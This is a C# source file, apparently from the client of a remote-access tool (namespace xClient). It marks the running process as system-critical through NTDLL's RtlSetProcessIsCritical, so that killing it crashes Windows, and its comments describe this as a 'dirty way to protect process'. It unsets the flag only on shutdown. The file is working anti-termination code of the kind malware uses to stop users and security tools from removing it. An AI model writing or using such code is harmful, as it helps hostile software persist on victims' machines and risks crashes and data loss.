using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace xClient.Core.Utilities
{
    class SetProcessIsCritical
    {

        [DllImport("NTDLL")]
        public static extern void RtlSetProcessIsCritical(bool nv, int ov, bool wl);

        public static bool CriticalStatus = false;

        /// <summary>
        ///    Set a process to Critical mode like some svchost.exe
        ///    therefore any attemping to kill our process will make
        ///    system crash (a dirty way to protect process), deactive critical before attemping to exit.
        /// </summary>
        /// <param name="Trigger">Switch ON(true)/OFF(false).</param>
        public static void Critical(bool Trigger)
        {

            if (Trigger == true && SystemCore.AccountType == "Admin")
            {
                try
                {
                    System.Diagnostics.Process.EnterDebugMode();
                    Microsoft.Win32.SystemEvents.SessionEnding += Handler_SessionEnding;
                    RtlSetProcessIsCritical(true, 0, false);
                    CriticalStatus = true;
                    System.Diagnostics.Debug.WriteLine("Critical is ON");
                }
                catch
                {
                }
            }
            if (Trigger == false && SystemCore.AccountType == "Admin")
            {
                try
                {

                    RtlSetProcessIsCritical(false, 0, false);
                    System.Diagnostics.Process.LeaveDebugMode();
                    CriticalStatus = false;
                    System.Diagnostics.Debug.WriteLine("Critical is OFF");
                }
                catch
                {
                }
            }
        }

        /// <summary>
        ///    Even reboot/shutdown can make system crash 
        ///    if Critical process not un-Critical properly so we'll need to capture shutdown
        ///    event then un-Critical process therefore shutdown can kill our.
        /// </summary>
        public static void Handler_SessionEnding(object sender, Microsoft.Win32.SessionEndingEventArgs e)
        {
            if (e.Reason == Microsoft.Win32.SessionEndReasons.SystemShutdown)
            {
                if (CriticalStatus == true)
                {
                    System.Diagnostics.Debug.WriteLine("System Reboot detected, turn off Critical");
                    RtlSetProcessIsCritical(false, 0, false);
                }

            }
        }


    }
}
